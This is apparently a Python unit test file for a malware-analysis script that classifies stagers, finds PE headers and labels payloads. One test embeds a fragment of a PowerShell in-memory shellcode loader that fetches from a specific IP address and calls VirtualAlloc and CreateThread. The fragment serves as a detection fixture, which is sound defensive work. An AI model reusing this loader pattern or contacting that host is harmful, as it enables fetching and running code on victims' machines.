import importlib.util
import tempfile
import unittest
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[1]
MODULE_PATH = REPO_ROOT / "scripts" / "reproduce_chain.py"


def load_module():
    spec = importlib.util.spec_from_file_location("reproduce_chain", MODULE_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class ReproduceChainTests(unittest.TestCase):
    def test_sha256_bytes_is_deterministic(self):
        chain = load_module()

        self.assertEqual(
            chain.sha256_bytes(b"abc"),
            "BA7816BF8F01CFEA414140DE5DAE2223B00361A396177A9CB410FF61F20015AD",
        )

    def test_stager_analysis_detects_url_and_memory_execution(self):
        chain = load_module()
        sample = """
$url = "http://158.94.208.104/x7GkP2mQ9zL4/my_newest_ll.png"
Invoke-WebRequest -Uri $url
Add-Type -TypeDefinition $csharp
[Kernel]::VirtualAlloc()
[Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)
[Kernel]::CreateThread()
"""
        with tempfile.TemporaryDirectory() as tmpdir:
            stager = Path(tmpdir) / "stager.ps1"
            stager.write_text(sample, encoding="utf-8")

            result = chain.analyze_stager(stager)

        self.assertEqual(
            result["urls"],
            ["http://158.94.208.104/x7GkP2mQ9zL4/my_newest_ll.png"],
        )
        self.assertTrue(result["uses_add_type"])
        self.assertTrue(result["uses_virtualalloc"])
        self.assertTrue(result["uses_createthread"])
        self.assertTrue(result["uses_marshal_copy"])
        self.assertEqual(result["classification"], "PowerShell in-memory shellcode loader")

    def test_extract_utf16le_strings_finds_expected_values(self):
        chain = load_module()
        data = b"\x00\x00p\x00o\x00w\x00e\x00r\x00s\x00h\x00e\x00l\x00l\x00\x00\x00x"

        strings = chain.extract_utf16le_strings(data, min_chars=4)

        self.assertIn("powershell", strings)

    def test_find_mz_offsets_returns_all_offsets(self):
        chain = load_module()

        self.assertEqual(chain.find_mz_offsets(b"MZaaaMZbbM"), [0, 5])

    def test_classify_payload_role_identifies_decoys_and_shellcode(self):
        chain = load_module()

        self.assertEqual(
            chain.classify_payload_role(b"<!DOCTYPE HTML><title>302 Found</title>"),
            "HTML redirect/decoy",
        )
        self.assertEqual(chain.classify_payload_role(b"\xe8\x00\x00\x00\x00payload"), "shellcode-like")
        self.assertEqual(chain.classify_payload_role(b"MZ\x90\x00"), "PE payload")

    def test_embedded_payload_slice_keeps_overlay_to_eof(self):
        chain = load_module()

        self.assertEqual(chain.embedded_payload_bytes(b"aaaMZpayloadOVERLAY", 3), b"MZpayloadOVERLAY")


if __name__ == "__main__":
    unittest.main()
